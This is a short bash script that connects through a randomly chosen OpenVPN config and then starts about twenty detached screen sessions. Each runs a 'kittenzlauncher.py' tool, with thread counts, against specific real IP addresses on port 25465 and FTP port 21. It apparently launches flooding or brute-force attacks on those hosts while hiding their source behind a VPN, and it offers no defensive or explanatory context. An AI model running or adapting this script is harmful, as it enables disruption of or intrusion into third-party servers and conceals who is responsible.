#!/bin/bash
#yum install nano unzip screen python-argparse epel-release -y; yum install openvpn -y

files=(/ovpn_tcp/*)
config="${files[RANDOM % ${#files[@]}]}"
killall python
killall python
killall openvpn
killall openvpn
screen -dmS vpn openvpn --config $config


#multi
screen -dms a python /kittenzlauncher.py -p -t 50 25465 107.174.19.150
screen -dms b python /kittenzlauncher.py -p -t 50 25465 107.174.19.154
screen -dms c python /kittenzlauncher.py -p -t 50 25465 176.31.103.7
screen -dms d python /kittenzlauncher.py -p -t 50 25465 45.35.54.3
screen -dms e python /kittenzlauncher.py -p -t 50 25465 45.35.54.5
screen -dms f python /kittenzlauncher.py -p -t 50 25465 45.35.54.52
screen -dms g python /kittenzlauncher.py -p -t 50 25465 45.35.54.55
screen -dms h python /kittenzlauncher.py -p -t 50 25465 45.35.54.57
screen -dms i python /kittenzlauncher.py -p -t 50 25465 45.35.54.118


#ftp
screen -dms j python /kittenzlauncher.py -p 21 -t 5 107.174.19.150
screen -dms k python /kittenzlauncher.py -p 21 -t 5 107.174.19.154
screen -dms l python /kittenzlauncher.py -p 21 -t 5 176.31.103.7
screen -dms m python /kittenzlauncher.py -p 21 -t 5 176.31.103.228
screen -dms n python /kittenzlauncher.py -p 21 -t 5 45.35.54.3
screen -dms o python /kittenzlauncher.py -p 21 -t 5 45.35.54.5
screen -dms p python /kittenzlauncher.py -p 21 -t 5 45.35.54.14
screen -dms q python /kittenzlauncher.py -p 21 -t 5 45.35.54.35
screen -dms r python /kittenzlauncher.py -p 21 -t 5 45.35.54.52
screen -dms s python /kittenzlauncher.py -p 21 -t 5 45.35.54.55
screen -dms t python /kittenzlauncher.py -p 21 -t 5 45.35.54.57
screen -dms u python /kittenzlauncher.py -p 21 -t 5 45.35.54.77
screen -dms v python /kittenzlauncher.py -p 21 -t 5 45.35.54.118
